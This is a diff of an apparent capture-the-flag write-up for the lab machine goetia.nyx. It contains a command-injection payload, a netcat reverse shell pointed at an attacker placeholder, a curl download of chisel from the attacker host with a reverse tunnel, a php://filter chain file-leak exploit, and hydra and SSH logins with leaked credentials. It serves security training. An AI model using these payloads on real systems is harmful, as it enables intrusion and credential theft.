@@ -19,7 +19,7 @@ The main page passes user input straight into a shell command, giving remote cod
 A full TCP port scan is run first:
 
 ```bash
-sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn goetia.nyx
+$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn goetia.nyx
 
 PORT   STATE SERVICE REASON
 22/tcp open  ssh     syn-ack ttl 64
@@ -30,11 +30,11 @@ MAC Address: 08:00:27:54:CF:0D (Oracle VirtualBox virtual NIC)
 Two ports are found open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:
 
 ```bash
-sudo nmap -p 22,80 -sCV goetia.nyx
+$ sudo nmap -p 22,80 -sCV goetia.nyx
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 bd:4b:59:a4:1c:b2:3a:f4:74:b5:7d:cf:49:a3:a9:47 (RSA)
 |   256 e9:eb:b8:67:48:f6:30:ec:e1:9a:27:ae:b7:1a:f9:05 (ECDSA)
 |_  256 0e:80:18:c9:37:1b:df:51:11:eb:49:86:a5:e7:1c:1c (ED25519)
@@ -65,22 +65,20 @@ As the nmap title suggested, the page is a simple Base64 decoding tool: a text f
 After intercepting the decode request and testing a few payloads against the `input` field, a semicolon-separated payload is enough to break out into arbitrary command execution:
 
 ```bash
-curl -sX POST "http://goetia.nyx/index.php" -d "input=;id;a" | grep "textarea" | html2text
+$ curl -sX POST "http://goetia.nyx/index.php" -d "input=;id;a" | grep "textarea" | html2text
 uid=48(apache) gid=48(apache) groups=48(apache)
 ```
 
 The output of `id` comes back inside the page's response, confirming the injection works. The same syntax is reused to get a reverse shell instead of a one-off command:
 
-> **Payload:** `; ;nc 10.0.2.15 9001 -e /bin/sh`
-
-<img src="../Images/goetia/Pasted image 20260714213952.png"/>
+> **Payload:** `; ;nc <ATTACKER_IP> <PORT> -e /bin/sh`
 
 A listener catches the callback:
 
 ```bash
-nc -nlvp 9001
-listening on [any] 9001 ...
-connect to [10.0.2.15] from (UNKNOWN) [10.0.2.39] 44792
+$ nc -nlvp <PORT>
+listening on [any] <PORT> ...
+connect to [<ATTACKER_IP>] from (UNKNOWN) [goetia.nyx] 44792
 id
 uid=48(apache) gid=48(apache) groups=48(apache)
 ```
@@ -118,17 +116,17 @@ tcp    LISTEN     0      100        [::1]:25                    [::]:*
 
 ```bash
 # Attacker machine
-python -m http.server
+$ python -m http.server
 
 # Victim machine
-curl http://10.0.2.15:8000/chisel --output chisel
+bash-4.2$ curl http://<ATTACKER_IP>:8000/chisel --output chisel
 ```
 
 A reverse tunnel is set up: the attack machine runs a chisel server waiting for a client to connect back, and the target's chisel client requests a remote forward — anything hitting port 8000 on the *attack* machine gets forwarded through the tunnel to `127.0.0.1:8000` on the *target*:
 
 ```bash
-# Attack Machine
-chisel server -p 9002 --reverse
+# Attacker machine
+$ chisel server -p 9002 --reverse
 2026/07/14 14:31:46 server: Reverse tunnelling enabled
 2026/07/14 14:31:46 server: Fingerprint JO9yqhma7pKrOPLTBF96kju4zunidJ1ngcjIuKz7/Ro=
 2026/07/14 14:31:46 server: Listening on http://0.0.0.0:9002
@@ -136,9 +134,9 @@ chisel server -p 9002 --reverse
 2026/07/14 14:34:26 server: session#1: Listening on http://0.0.0.0:9002
 2026/07/14 14:34:26 server: session#1: tun: proxy#R:8000⇒8000: Listening on 0.0.0.0:9002
 
-# Victim Machine
-./chisel client 10.0.2.15:9002 R:8000:127.0.0.1:8000
-2026/07/14 14:34:27 client: Connecting to ws://10.0.2.15:9002
+# Victim machine
+bash-4.2$ ./chisel client <ATTACKER_IP>:9002 R:8000:127.0.0.1:8000
+2026/07/14 14:34:27 client: Connecting to ws://<ATTACKER_IP>:9002
 2026/07/14 14:34:27 client: Connected (Latency 2.742592ms)
 ```
 
@@ -154,7 +152,7 @@ http://localhost:8000
 A content discovery scan is run against the tunneled app, fuzzing both filenames and extensions at once:
 
 ```bash
-wfuzz -c -t 200 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/common.txt -z list,php-zip "http://localhost:8000/FUZZ.FUZ2Z"
+$ wfuzz -c -t 200 --hc=404 -w /usr/share/seclists/Discovery/Web-Content/common.txt -z list,php-zip "http://localhost:8000/FUZZ.FUZ2Z"
 
 ID           Response   Lines   Word   Chars   Payload
 ========================================================
@@ -178,13 +176,13 @@ http://localhost:8000/autobackup.zip
 The archive holds the app's source:
 
 ```bash
-unzip autobackup.zip
+$ unzip autobackup.zip
 Archive:  autobackup.zip
   inflating: index.php
 ```
 
 ```bash
-cat index.php
+$ cat index.php
 <?php
 echo "<h1>MD5 function!</h1>";
 echo "Do you want to know the MD5 value of an internal server file? Go ahead ... <br><br>";
@@ -201,7 +199,7 @@ The line that matters is `md5_file($_POST['input'])`: the POST body is passed di
 PHP's `php://filter` chains can be stacked to progressively transform a file's contents — without ever writing to disk — until what gets included is valid, attacker-chosen PHP. That's what this class of exploit automates: it brute-forces a chain of filters that mutates an existing file into arbitrary PHP, byte by byte, then triggers it through the include:
 
 ```bash
-python3 filters_chain_oracle_exploit.py --target http://127.0.0.1:8000 --file '/var/www/html/hidden.php' --parameter input
+$ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1:8000 --file '/var/www/html/hidden.php' --parameter input
 
 [+] File /var/www/html/hidden.php leak is finished!
 PD9waHAKZGVmaW5lKCdEQl90QU1lJywgJ0FuRWxpemFiZXRoYW5EZXZpbFdvcnNoaXBwZXJzUHJheWVyQm9vayonKZ
@@ -219,7 +217,7 @@ define('DB_CHARSET', 'utf8');?>"
 The credentials are validated against SSH:
 
 ```bash
-hydra -l 'ebathory' -p 'C43r1m0n14S4nguil3ntu' ssh://goetia.nyx
+$ hydra -l 'ebathory' -p 'C43r1m0n14S4nguil3ntu' ssh://goetia.nyx
 
 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to red
 uce the tasks: use -t 4
@@ -233,7 +231,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-14 15:01:
 They check out, and a connection follows:
 
 ```bash
-ssh ebathory@goetia.nyx
+$ ssh ebathory@goetia.nyx
 ** WARNING: connection is not using a post-quantum key exchange algorithm.
 ** This session may be vulnerable to "store now, decrypt later" attacks.
 ** The server may need to be upgraded. See https://openssh.com/pq.html
